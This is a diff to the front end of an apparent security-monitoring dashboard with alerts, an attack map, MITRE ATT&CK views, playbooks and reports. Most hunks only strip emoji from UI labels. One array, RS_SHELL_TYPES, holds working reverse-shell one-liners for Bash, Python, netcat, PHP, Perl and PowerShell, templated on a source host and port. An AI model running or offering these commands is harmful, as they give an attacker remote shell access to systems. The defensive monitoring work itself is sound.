@@ -1101,7 +1101,7 @@ button { cursor: pointer; }
 
       <div class="sidenav-section-lbl">OVERVIEW</div>
       <div class="sidenav-item active" id="tab-incidents" onclick="setTab('incidents')">
-        <span class="sidenav-icon">📋</span>
+        <span class="sidenav-icon"></span>
         <span class="sidenav-label">Dashboard</span>
       </div>
 
@@ -1109,13 +1109,13 @@ button { cursor: pointer; }
       <div class="sidenav-section-lbl">MONITORING</div>
 
       <div class="sidenav-item" id="tab-live" onclick="setTab('live')">
-        <span class="sidenav-icon">📡</span>
+        <span class="sidenav-icon"></span>
         <span class="sidenav-label">Live Feed</span>
         <span class="sidenav-badge" id="live-badge" style="display:none;">0</span>
       </div>
 
       <div class="sidenav-item" id="tab-intel" onclick="setTab('intel')">
-        <span class="sidenav-icon">🌍</span>
+        <span class="sidenav-icon"></span>
         <span class="sidenav-label">Attack Map</span>
       </div>
 
@@ -1123,12 +1123,12 @@ button { cursor: pointer; }
       <div class="sidenav-section-lbl">INTELLIGENCE</div>
 
       <div class="sidenav-item" id="tab-mitre" onclick="setTab('mitre')">
-        <span class="sidenav-icon">🎯</span>
+        <span class="sidenav-icon"></span>
         <span class="sidenav-label">MITRE ATT&amp;CK</span>
       </div>
 
       <div class="sidenav-item" id="tab-playbooks" onclick="setTab('playbooks')">
-        <span class="sidenav-icon">🤖</span>
+        <span class="sidenav-icon"></span>
         <span class="sidenav-label">Playbooks</span>
       </div>
 
@@ -1136,13 +1136,13 @@ button { cursor: pointer; }
       <div class="sidenav-section-lbl">REPORTS</div>
 
       <div class="sidenav-item" id="tab-reports" onclick="setTab('reports')">
-        <span class="sidenav-icon">📁</span>
+        <span class="sidenav-icon"></span>
         <span class="sidenav-label">Report History</span>
         <span class="sidenav-badge" id="reports-badge" style="display:none;">0</span>
       </div>
 
       <div class="sidenav-sub" id="tab-bulkreport" onclick="openBulkReport()">
-        <span>📦</span>
+        <span></span>
         <span>Bulk Download</span>
       </div>
 
@@ -1162,7 +1162,7 @@ button { cursor: pointer; }
   <!-- Top bar -->
   <div class="topbar">
     <div class="topbar-left">
-      <span id="page-title" style="font-family:var(--sans);font-size:14px;font-weight:700;color:var(--text);letter-spacing:.3px;white-space:nowrap;">📋Dashboard</span>
+      <span id="page-title" style="font-family:var(--sans);font-size:14px;font-weight:700;color:var(--text);letter-spacing:.3px;white-space:nowrap;">Dashboard</span>
       <div id="conn-banner" style="margin:0;border-radius:6px;padding:5px 12px;font-size:11px;">
         <span>⚠</span>
         <span id="conn-msg">Cannot reach API — Is <code>python app.py</code> running?</span>
@@ -1200,10 +1200,10 @@ button { cursor: pointer; }
   <div id="panel-incidents">
     <!-- Stat cards — home only -->
     <div class="stat-grid" id="stat-grid">
-      <div class="stat-card" style="--accent:#60a5fa;"><div class="stat-icon">🚨</div><div class="stat-label">Total Alerts</div><div class="stat-value" id="s-total">—</div><div class="stat-sub">All time</div></div>
-      <div class="stat-card" style="--accent:#f87171;"><div class="stat-icon">🔴</div><div class="stat-label">Open Incidents</div><div class="stat-value" id="s-open">—</div><div class="stat-sub">Require action</div></div>
-      <div class="stat-card" style="--accent:#c084fc;"><div class="stat-icon">💀</div><div class="stat-label">Critical Alerts</div><div class="stat-value" id="s-crit">—</div><div class="stat-sub">Immediate threat</div></div>
-      <div class="stat-card" style="--accent:#f97316;"><div class="stat-icon">⚡</div><div class="stat-label">High Severity</div><div class="stat-value" id="s-high">—</div><div class="stat-sub">Priority review</div></div>
+      <div class="stat-card" style="--accent:#60a5fa;"><div class="stat-icon"></div><div class="stat-label">Total Alerts</div><div class="stat-value" id="s-total">—</div><div class="stat-sub">All time</div></div>
+      <div class="stat-card" style="--accent:#f87171;"><div class="stat-icon"></div><div class="stat-label">Open Incidents</div><div class="stat-value" id="s-open">—</div><div class="stat-sub">Require action</div></div>
+      <div class="stat-card" style="--accent:#c084fc;"><div class="stat-icon"></div><div class="stat-label">Critical Alerts</div><div class="stat-value" id="s-crit">—</div><div class="stat-sub">Immediate threat</div></div>
+      <div class="stat-card" style="--accent:#f97316;"><div class="stat-icon"></div><div class="stat-label">High Severity</div><div class="stat-value" id="s-high">—</div><div class="stat-sub">Priority review</div></div>
     </div>
     <!-- Top IP Section — home only -->
     <div class="ip-section">
@@ -1230,7 +1230,7 @@ button { cursor: pointer; }
         </div>
         <div class="ip-right">
           <div class="heat-panel">
-            <div class="heat-lbl">🔥 Threat Heatmap</div>
+            <div class="heat-lbl"> Threat Heatmap</div>
             <div class="heat-grid" id="heat-header" style="margin-bottom:8px;">
               <span style="font-family:var(--mono);font-size:9px;color:var(--dim);">IP</span>
               <span style="font-family:var(--mono);font-size:9px;color:var(--dim);text-align:center;">C</span>
@@ -1372,7 +1372,7 @@ button { cursor: pointer; }
         </div>
         <!-- Anomalies -->
         <div style="width:100%;margin-top:4px;">
-          <div style="font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:8px;">⚡ ANOMALIES DETECTED</div>
+          <div style="font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:8px;"> ANOMALIES DETECTED</div>
           <div id="anomaly-list"><div style="color:var(--muted);font-size:12px;font-family:var(--mono);">No anomalies detected</div></div>
         </div>
       </div>
@@ -1380,7 +1380,7 @@ button { cursor: pointer; }
       <!-- Timeline Chart -->
       <div class="timeline-panel">
         <div class="timeline-head">
-          <span style="font-family:var(--mono);font-size:11px;letter-spacing:2px;color:var(--text);">📈 ALERT TIMELINE — LAST 24H</span>
+          <span style="font-family:var(--mono);font-size:11px;letter-spacing:2px;color:var(--text);"> ALERT TIMELINE — LAST 24H</span>
           <span id="timeline-total" style="font-family:var(--mono);font-size:11px;color:var(--muted);"></span>
         </div>
         <div class="timeline-chart-wrap">
@@ -1392,7 +1392,7 @@ button { cursor: pointer; }
     <!-- Attack Map -->
     <div class="map-panel" style="margin-top:14px;">
       <div class="map-head">
-        <span class="map-head-title">🌍 GLOBAL ATTACK MAP — LIVE ATTACKER GEOLOCATION</span>
+        <span class="map-head-title"> GLOBAL ATTACK MAP — LIVE ATTACKER GEOLOCATION</span>
         <div style="display:flex;gap:8px;align-items:center;">
           <span id="map-attacker-count" style="font-family:var(--mono);font-size:11px;color:var(--muted);"></span>
           <button class="btn btn-ghost" style="font-size:10px;" onclick="loadAttackMap()">↻ REFRESH</button>
@@ -1412,7 +1412,7 @@ button { cursor: pointer; }
       <!-- Top Attackers -->
       <div class="panel">
         <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:var(--bg);display:flex;justify-content:space-between;align-items:center;">
-          <span style="font-family:var(--mono);font-size:11px;letter-spacing:2px;">🔥 TOP ATTACKING IPs</span>
+          <span style="font-family:var(--mono);font-size:11px;letter-spacing:2px;"> TOP ATTACKING IPs</span>
           <button class="btn btn-ghost" style="font-size:10px;" onclick="loadTopAttackers()">↻</button>
         </div>
         <div id="top-attackers-list"></div>
@@ -1420,7 +1420,7 @@ button { cursor: pointer; }
       <!-- Blocked IPs -->
       <div class="panel">
         <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:var(--bg);display:flex;justify-content:space-between;align-items:center;">
-          <span style="font-family:var(--mono);font-size:11px;letter-spacing:2px;">🚫 BLOCKED IPs (iptables)</span>
+          <span style="font-family:var(--mono);font-size:11px;letter-spacing:2px;"> BLOCKED IPs (iptables)</span>
           <button class="btn btn-ghost" style="font-size:10px;" onclick="loadBlockedIPs()">↻</button>
         </div>
         <div id="blocked-ips-list" style="max-height:320px;overflow-y:auto;"></div>
@@ -1433,7 +1433,7 @@ button { cursor: pointer; }
   <div id="panel-mitre" style="display:none;">
     <div class="mitre-panel">
       <div class="mitre-head">
-        <span style="font-family:var(--mono);font-size:11px;letter-spacing:2px;">🎯 MITRE ATT&CK FRAMEWORK — DETECTED TECHNIQUES</span>
+        <span style="font-family:var(--mono);font-size:11px;letter-spacing:2px;"> MITRE ATT&CK FRAMEWORK — DETECTED TECHNIQUES</span>
         <button class="btn btn-ghost" style="font-size:10px;" onclick="loadMitre()">↻ REFRESH</button>
       </div>
       <div id="mitre-grid" class="mitre-grid">
@@ -1454,7 +1454,7 @@ button { cursor: pointer; }
   <div id="panel-playbooks" style="display:none;">
     <div class="playbook-panel">
       <div class="mitre-head">
-        <span style="font-family:var(--mono);font-size:11px;letter-spacing:2px;">🤖 AUTOMATED RESPONSE PLAYBOOK LOG</span>
+        <span style="font-family:var(--mono);font-size:11px;letter-spacing:2px;"> AUTOMATED RESPONSE PLAYBOOK LOG</span>
         <button class="btn btn-ghost" style="font-size:10px;" onclick="loadPlaybooks()">↻ REFRESH</button>
       </div>
       <div class="pb-row pb-head">
@@ -1471,14 +1471,14 @@ button { cursor: pointer; }
       <!-- Bulk report sub-section inside Reports -->
       <div style="padding:14px 16px;border-bottom:1px solid var(--border);background:var(--bg);display:flex;align-items:center;justify-content:space-between;">
         <div>
-          <span style="font-family:var(--mono);font-size:11px;letter-spacing:2px;color:var(--text);">📦 BULK REPORT DOWNLOAD</span>
+          <span style="font-family:var(--mono);font-size:11px;letter-spacing:2px;color:var(--text);"> BULK REPORT DOWNLOAD</span>
           <div style="font-family:var(--mono);font-size:10px;color:var(--muted);margin-top:3px;">Export multiple alerts as a single HTML report</div>
         </div>
-        <button class="btn btn-blue" onclick="openBulkReport()" style="font-size:11px;">📦 GENERATE BULK REPORT</button>
+        <button class="btn btn-blue" onclick="openBulkReport()" style="font-size:11px;"> GENERATE BULK REPORT</button>
       </div>
       <div class="filter-bar" style="justify-content:space-between;">
         <div style="display:flex;align-items:center;gap:10px;">
-          <span style="font-family:var(--mono);font-size:13px;font-weight:700;color:var(--text);">📁 GENERATED REPORTS</span>
+          <span style="font-family:var(--mono);font-size:13px;font-weight:700;color:var(--text);"> GENERATED REPORTS</span>
           <span class="tab-badge" id="reports-count-lbl" style="display:inline-block;">0 reports</span>
         </div>
         <button class="btn btn-red" style="font-size:10px;" onclick="clearReportHistory()">🗑 CLEAR ALL</button>
@@ -1522,7 +1522,7 @@ button { cursor: pointer; }
         <div class="cfg-row"><label>Chat ID</label><input class="cfg-input" id="cfg-tg-chat" placeholder="-1001234567890 or @username"></div>
         <div style="margin-top:10px;display:flex;gap:8px;align-items:center;">
           <button onclick="testTelegram()" style="padding:8px 18px;border-radius:6px;border:1px solid var(--border);background:var(--panel);color:var(--text);font-family:var(--mono);font-size:11px;cursor:pointer;transition:all .15s;" onmouseover="this.style.borderColor='#229ED9';this.style.color='#229ED9'" onmouseout="this.style.borderColor='var(--border)';this.style.color='var(--text)'">
-            📱 Send Test Message
+             Send Test Message
           </button>
           <span id="tg-test-result" style="font-family:var(--mono);font-size:11px;"></span>
         </div>
@@ -1605,7 +1605,7 @@ button { cursor: pointer; }
   <div class="modal" style="max-width:620px;">
     <div class="modal-head">
       <div>
-        <div style="font-size:18px;font-weight:700;">📦 Bulk Report Generator</div>
+        <div style="font-size:18px;font-weight:700;"> Bulk Report Generator</div>
         <div style="font-family:var(--mono);font-size:10px;color:var(--muted);margin-top:4px;letter-spacing:1px;">EXPORT ALERTS BY DATE RANGE &amp; SEVERITY</div>
       </div>
       <button class="modal-close" onclick="closeBulkReport()">✕</button>
@@ -1614,7 +1614,7 @@ button { cursor: pointer; }
 
       <!-- Date Range -->
       <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:14px;">
-        <div style="font-family:var(--mono);font-size:10px;letter-spacing:2px;color:var(--muted);margin-bottom:12px;">📅 DATE RANGE</div>
+        <div style="font-family:var(--mono);font-size:10px;letter-spacing:2px;color:var(--muted);margin-bottom:12px;"> DATE RANGE</div>
         <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
           <div>
             <div style="font-family:var(--mono);font-size:10px;color:var(--muted);margin-bottom:6px;">FROM</div>
@@ -1636,7 +1636,7 @@ button { cursor: pointer; }
 
       <!-- Severity Filter -->
       <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:14px;">
-        <div style="font-family:var(--mono);font-size:10px;letter-spacing:2px;color:var(--muted);margin-bottom:12px;">🎯 SEVERITY <span style="color:var(--dim);font-size:9px;">(leave all unchecked = include all)</span></div>
+        <div style="font-family:var(--mono);font-size:10px;letter-spacing:2px;color:var(--muted);margin-bottom:12px;"> SEVERITY <span style="color:var(--dim);font-size:9px;">(leave all unchecked = include all)</span></div>
         <div style="display:flex;gap:8px;flex-wrap:wrap;" id="bulk-sev-filters"></div>
       </div>
 
@@ -1645,7 +1645,7 @@ button { cursor: pointer; }
       <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:14px;">
         <div style="font-family:var(--mono);font-size:10px;letter-spacing:2px;color:var(--muted);margin-bottom:12px;">📄 OUTPUT FORMAT</div>
         <div style="display:flex;gap:8px;">
-          <button class="btn btn-blue" style="font-size:11px;cursor:default;">🌐 HTML</button>
+          <button class="btn btn-blue" style="font-size:11px;cursor:default;"> HTML</button>
         </div>
       </div>
 
@@ -1655,7 +1655,7 @@ button { cursor: pointer; }
       <!-- Actions -->
       <div style="display:flex;gap:8px;justify-content:flex-end;">
         <button class="btn btn-ghost" onclick="closeBulkReport()">Cancel</button>
-        <button class="btn btn-blue" id="bulk-generate-btn" onclick="generateBulkReport()">⚡ GENERATE REPORT</button>
+        <button class="btn btn-blue" id="bulk-generate-btn" onclick="generateBulkReport()"> GENERATE REPORT</button>
       </div>
     </div>
   </div>
@@ -2073,14 +2073,14 @@ async function updateStatus(id, status) {
 // ══════════════════════════════════════════════════════════════════════════════
 async function generateReport(id) {
     const btn = event?.target;
-    if (btn) { btn.textContent = '⏳ Generating…'; btn.disabled = true; }
+    if (btn) { btn.textContent = ' Generating…'; btn.disabled = true; }
 
     const r = await apiFetch(`/api/alerts/${id}/report`, { method:'POST' });
 
     if (btn) { btn.textContent = 'GENERATE REPORT'; btn.disabled = false; }
 
     if (!r) {
-        showNotif('❌ Report generation failed. Is the server running?', 'error', 5000);
+        showNotif(' Report generation failed. Is the server running?', 'error', 5000);
         return;
     }
 
@@ -2099,7 +2099,7 @@ async function generateReport(id) {
     renderReports();
 
     showNotif(
-        `✅ Report ready — <a href="${API}${r.html}" target="_blank" style="color:var(--blue);">View HTML</a>`,
+        ` Report ready — <a href="${API}${r.html}" target="_blank" style="color:var(--blue);">View HTML</a>`,
         'success', 8000
     );
 }
@@ -2533,12 +2533,12 @@ function setTab(tab) {
   });
   // Update page title in topbar
   const TITLES = {
-    incidents: '📋 Dashboard',
-    live:      '📡 Live Feed',
-    intel:     '🌍 Attack Map',
-    mitre:     '🎯 MITRE ATT&CK',
-    playbooks: '🤖 Playbooks',
-    reports:   '📁 Reports',
+    incidents: ' Dashboard',
+    live:      ' Live Feed',
+    intel:     ' Attack Map',
+    mitre:     ' MITRE ATT&CK',
+    playbooks: ' Playbooks',
+    reports:   ' Reports',
   };
   const titleEl = document.getElementById('page-title');
   if (titleEl) titleEl.textContent = TITLES[tab] || '';
@@ -2564,7 +2564,7 @@ function showToast(alert) {
   el.innerHTML = `
     <div class="toast-lbl">
       <div class="pulse-wrap"><div class="pulse-ring" style="background:${m.c};opacity:.4;"></div><div class="pulse-dot" style="background:${m.c};"></div></div>
-      <span style="color:${m.c};">${alert.severity==='Critical'?'🚨 ':''}Live Alert · ${alert.severity}</span>
+      <span style="color:${m.c};">${alert.severity==='Critical'?' ':''}Live Alert · ${alert.severity}</span>
     </div>
     <div class="toast-name">${fmtType(alert.alert_type)}</div>
     <div class="toast-ip">${alert.source_ip} → ${alert.dest_ip}</div>
@@ -2602,7 +2602,7 @@ async function testTelegram() {
   const chat_id = document.getElementById('cfg-tg-chat').value.trim();
   const res     = document.getElementById('tg-test-result');
   if (!token || !chat_id) { res.textContent = '⚠ Enter token and chat ID first'; res.style.color = 'var(--c-med)'; return; }
-  res.textContent = '⏳ Sending…'; res.style.color = 'var(--muted)';
+  res.textContent = ' Sending…'; res.style.color = 'var(--muted)';
   const r = await apiFetch('/api/config/test-telegram', {
     method: 'POST',
     body:   JSON.stringify({ token, chat_id }),
@@ -2621,7 +2621,7 @@ async function saveConfig() {
   };
   const r = await apiFetch('/api/config', { method:'PUT', body:JSON.stringify(body) });
   if (r && r.ok) { showNotif('✓ Configuration saved.', 'success'); closeConfig(); }
-  else showNotif('❌ Failed to save config.', 'error');
+  else showNotif(' Failed to save config.', 'error');
 }
 
 
@@ -2650,7 +2650,7 @@ async function submitIngest() {
     await loadAlerts();
   } else {
     res.style.borderColor = 'var(--cbr-high)';
-    res.innerHTML = `<span style="color:var(--c-high);">❌ Ingest failed. Is the server running?</span>`;
+    res.innerHTML = `<span style="color:var(--c-high);"> Ingest failed. Is the server running?</span>`;
   }
 }
 
@@ -3476,12 +3476,12 @@ async function bootDashboard() {
 // ══════════════════════════════════════════════════════════════════════════════
 
 const RS_SHELL_TYPES = [
-  { id:'bash',    label:'Bash TCP',    icon:'🐧', cmd:'bash -i >& /dev/tcp/{src}/{port} 0>&1' },
-  { id:'python',  label:'Python',      icon:'🐍', cmd:'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{src}",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/bash","-i"])\'' },
-  { id:'nc',      label:'Netcat',      icon:'📡', cmd:'nc -e /bin/bash {src} {port}' },
-  { id:'php',     label:'PHP',         icon:'🐘', cmd:'php -r \'$sock=fsockopen("{src}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'' },
-  { id:'perl',    label:'Perl',        icon:'🦙', cmd:'perl -e \'use Socket;$i="{src}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'' },
-  { id:'powershell',label:'PowerShell',icon:'🪟', cmd:'powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient(\'{src}\',{port});$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.Encoding.ASCII).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($sb),0,$sb.Length)}"' },
+  { id:'bash',    label:'Bash TCP',    icon:'', cmd:'bash -i >& /dev/tcp/{src}/{port} 0>&1' },
+  { id:'python',  label:'Python',      icon:'', cmd:'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{src}",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/bash","-i"])\'' },
+  { id:'nc',      label:'Netcat',      icon:'', cmd:'nc -e /bin/bash {src} {port}' },
+  { id:'php',     label:'PHP',         icon:'', cmd:'php -r \'$sock=fsockopen("{src}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'' },
+  { id:'perl',    label:'Perl',        icon:'', cmd:'perl -e \'use Socket;$i="{src}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'' },
+  { id:'powershell',label:'PowerShell',icon:'', cmd:'powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient(\'{src}\',{port});$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.Encoding.ASCII).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($sb),0,$sb.Length)}"' },
 ];
 
 let rsShellType = 'bash';
@@ -3585,7 +3585,7 @@ async function generateBulkReport() {
   const btn = document.getElementById('bulk-generate-btn');
   const res = document.getElementById('bulk-result');
   btn.disabled = true;
-  btn.textContent = '⏳ Generating…';
+  btn.textContent = ' Generating…';
   res.style.display = 'none';
 
   const fromVal = document.getElementById('bulk-from').value;
@@ -3600,20 +3600,20 @@ async function generateBulkReport() {
   const r = await apiFetch('/api/reports/bulk', { method:'POST', body: JSON.stringify(body) });
 
   btn.disabled = false;
-  btn.textContent = '⚡ GENERATE REPORT';
+  btn.textContent = ' GENERATE REPORT';
   res.style.display = 'block';
 
   if (r && r.ok) {
     res.style.cssText = 'display:block;background:rgba(52,211,153,.06);border:1px solid rgba(52,211,153,.25);border-radius:8px;padding:14px 16px;margin-bottom:14px;font-family:var(--mono);font-size:12px;';
     res.innerHTML = `
-      <div style="color:var(--c-low);font-weight:700;font-size:13px;margin-bottom:10px;">✅ Report Ready — ${r.count} alerts exported</div>
+      <div style="color:var(--c-low);font-weight:700;font-size:13px;margin-bottom:10px;"> Report Ready — ${r.count} alerts exported</div>
       <div style="display:flex;gap:8px;flex-wrap:wrap;">
-        ${r.html ? `<a href="${API}${r.html}" target="_blank" class="btn btn-blue" style="text-decoration:none;font-size:11px;padding:6px 14px;">🌐 View HTML</a>` : ''}
+        ${r.html ? `<a href="${API}${r.html}" target="_blank" class="btn btn-blue" style="text-decoration:none;font-size:11px;padding:6px 14px;"> View HTML</a>` : ''}
       </div>`;
   } else {
     const msg = r?.error || 'Generation failed — no alerts match the filters.';
     res.style.cssText = 'display:block;background:rgba(248,113,113,.08);border:1px solid rgba(248,113,113,.3);border-radius:8px;padding:14px 16px;margin-bottom:14px;font-family:var(--mono);font-size:12px;color:var(--c-high);';
-    res.innerHTML = `❌ ${msg}`;
+    res.innerHTML = ` ${msg}`;
   }
 }
 
@@ -3857,8 +3857,8 @@ async function loadBlockedIPs() {
 
 async function unblockIP(ip) {
   const r = await apiFetch(`/api/blocked-ips/${ip}`, { method:'DELETE' });
-  if (r?.ok) { showToastMsg(`✅ ${ip} unblocked`); loadBlockedIPs(); }
-  else        { showToastMsg(`❌ Failed to unblock ${ip}`, 'high'); }
+  if (r?.ok) { showToastMsg(` ${ip} unblocked`); loadBlockedIPs(); }
+  else        { showToastMsg(` Failed to unblock ${ip}`, 'high'); }
 }
 
 function showToastMsg(msg, sev='low') {
@@ -3961,8 +3961,8 @@ async function loadPlaybooks() {
 // ── Run playbook on alert ─────────────────────────────────────────────────────
 async function runPlaybook(alertId) {
   const r = await apiFetch(`/api/playbooks/run/${alertId}`, { method:'POST' });
-  if (r?.ok) { showToastMsg('🤖 Playbook executed successfully'); }
-  else        { showToastMsg('❌ Playbook execution failed', 'high'); }
+  if (r?.ok) { showToastMsg('Playbook executed successfully'); }
+  else        { showToastMsg('Playbook execution failed', 'high'); }
 }
 
 // ── Intel tab loader (called on tab switch) ───────────────────────────────────
